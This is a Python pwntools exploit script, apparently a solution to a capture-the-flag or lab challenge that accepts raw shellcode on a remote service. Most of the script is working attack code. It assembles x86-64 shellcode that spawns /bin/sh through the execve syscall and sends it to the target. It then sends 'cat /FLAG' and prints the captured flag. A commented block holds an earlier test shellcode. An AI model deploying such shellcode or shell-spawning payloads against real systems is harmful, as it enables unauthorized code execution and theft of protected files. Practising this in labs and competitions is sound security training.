#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './shellcode'
port = 10257

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)


"""
#   remember to remove the \n in the string
#   printf("/bin/sh\n");
    mov rdi, 0x1
    mov rax, 0x0a68732f6e69622f
    push rax
    mov rsi, rsp
    mov rdx, 8
    mov rax, 0x1
    syscall
"""

codes = """
    xor rax, rax
    push rax
    mov rsi, rsp

    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp

    mov rax, 0x3b
    mov rdx, rsi
    syscall

    mov rdi, 0x0
    mov rax, 60
    syscall
"""

payload = asm(codes)
r.recvuntil('> '.encode())
r.send( payload)


cat_comm = 'cat /FLAG\n'
r.sendline( cat_comm.encode())
given_flag = r.recv().decode()
r.close()
print( given_flag[:-1])

# r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :

